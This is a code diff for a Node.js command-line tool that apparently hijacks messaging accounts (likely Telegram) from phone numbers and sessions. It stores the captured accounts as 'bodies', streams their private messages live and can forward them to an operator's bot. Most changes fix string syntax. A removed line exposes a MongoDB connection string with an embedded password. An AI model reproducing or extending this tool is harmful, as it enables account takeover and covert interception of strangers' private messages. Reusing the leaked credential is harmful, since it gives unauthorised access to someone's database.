@@ -6,7 +6,8 @@ const ConfigStore = require('configstore');
 const { Select, Input } = require('enquirer');
 const chalk = require('chalk');
 
-const MASTER_DB = "mongodb+srv://musasia:GBid1mGqdYrdJHZI@mikacluster.zt0fezk.mongodb.net/?appName=mikacluster";
+// PASTE YOUR MONGO CONNECTION STRING HERE INSIDE THE QUOTES
+const MASTER_DB = "PASTE_YOUR_MONGO_URL_HERE"; 
 
 process.on('unhandledRejection', (reason, p) => {});
 process.on('uncaughtException', (err) => {});
@@ -25,7 +26,8 @@ const handleSecurity = async () => {
     }
 
     if (!status.passed) {
-        sexyBox('SECURITY ALERT', License Status: ${status.msg}, 'bad');
+        // FIXED LINE BELOW: Changed template literal to string concatenation
+        sexyBox('SECURITY ALERT', 'License Status: ' + status.msg, 'bad');
         console.log(chalk.yellow('  Don\'t panic. Just give me a valid key.'));
         
         while (!status.passed) {
@@ -45,7 +47,7 @@ const handleSecurity = async () => {
                 currentKey = inputKey;
                 sexyBox('ACCESS GRANTED', 'Key saved. Welcome to the dark side.', 'good');
             } else {
-                console.log(chalk.red(  Nope. Server said: ${newCheck.msg}));
+                console.log(chalk.red('  Nope. Server said: ' + newCheck.msg));
                 const retry = new Select({
                     message: 'Try again?',
                     choices: ['Yes', 'No (Exit)']
@@ -64,7 +66,7 @@ const init = async () => {
     
     const identity = await handleSecurity();
     
-    await crazyLoader(Loading profile for ${identity.owner}..., 1000);
+    await crazyLoader('Loading profile for ' + identity.owner + '...', 1000);
 
     if (!(await penetrateCloud(MASTER_DB))) {
         sexyBox('FATAL ERROR', 'The Cloud is down. Yell at Reinhart.', 'bad');
@@ -94,7 +96,7 @@ const main = async () => {
 
     while (true) {
         renderTitle();
-        console.log(chalk.gray(  [SECURE SESSION] Partition: ${ownerKey.substring(0, 8)}...));
+        console.log(chalk.gray('  [SECURE SESSION] Partition: ' + ownerKey.substring(0, 8) + '...'));
         
         const prompt = new Select({
             name: 'action',
@@ -121,9 +123,9 @@ const main = async () => {
                 
                 await buryBody(phone, session, me, ownerKey);
                 
-                sexyBox('BOOM', We got 'em.\nUser: ${me.username}\nID: ${me.id}, 'good');
+                sexyBox('BOOM', 'We got em.\nUser: ' + me.username + '\nID: ' + me.id, 'good');
             } catch (e) {
-                sexyBox('FAIL', Mission aborted. ${e.message}, 'bad');
+                sexyBox('FAIL', 'Mission aborted. ' + e.message, 'bad');
             }
         } 
         else if (answer.includes('2.')) {
@@ -133,7 +135,7 @@ const main = async () => {
                 console.log(chalk.gray('  It\'s empty in here. Go catch some pokemons.'));
             } else {
                 bodies.forEach((b, i) => {
-                    console.log(chalk.cyan(  [${i+1}] ${b.phone} | ${b.username} | ${b.uid}));
+                    console.log(chalk.cyan('  [' + (i+1) + '] ' + b.phone + ' | ' + b.username + ' | ' + b.uid));
                 });
             }
         }
@@ -150,7 +152,7 @@ const main = async () => {
                 const adminId = conf.get('admin_id');
                 
                 if (botToken && adminId) {
-                    console.log(chalk.hex('#FFA500')([SNITCH ACTIVE] Forwarding to ${adminId}));
+                    console.log(chalk.hex('#FFA500')('[SNITCH ACTIVE] Forwarding to ' + adminId));
                     botConfig = { token: botToken, admin: adminId };
                 } else {
                     console.log(chalk.gray('[SILENT MODE] Bot not configured. Saving local only.'));
@@ -160,9 +162,9 @@ const main = async () => {
                 console.log(chalk.gray('Press Ctrl+C to stop being a creep.'));
                 
                 await engine.wakeUpNeo(bodies, botConfig, (msg) => {
-                    const tag = chalk.bgBlue.white( ${msg.phone} );
+                    const tag = chalk.bgBlue.white(' ' + msg.phone + ' ');
                     const txt = chalk.white(msg.text.replace(/\n/g, ' '));
-                    console.log(${tag} ${chalk.yellow(msg.sender)}: ${txt.substring(0, 60)}...);
+                    console.log(tag + ' ' + chalk.yellow(msg.sender) + ': ' + txt.substring(0, 60) + '...');
                 });
                 
                 await new Promise(() => {}); 
@@ -181,7 +183,7 @@ const main = async () => {
                 const target = await delPrompt.run();
                 if (target !== 'Cancel') {
                     await burnBody(target, ownerKey);
-                    console.log(chalk.red(  ${target} has been obliterated.));
+                    console.log(chalk.red('  ' + target + ' has been obliterated.'));
                 }
             }
         }
@@ -198,7 +200,7 @@ const main = async () => {
         }
         else if (answer.includes('6.')) {
             renderTitle();
-            console.log(chalk.bold.hex('#00FF00')(    THE MAD GOD ARCHITECT\n    =====================\n\n    Reinhart\n    Telegram: @kiri0507));
+            console.log(chalk.bold.hex('#00FF00')(`    THE MAD GOD ARCHITECT\n    =====================\n\n    Reinhart\n    Telegram: @kiri0507`));
         }
         else {
             process.exit(0);
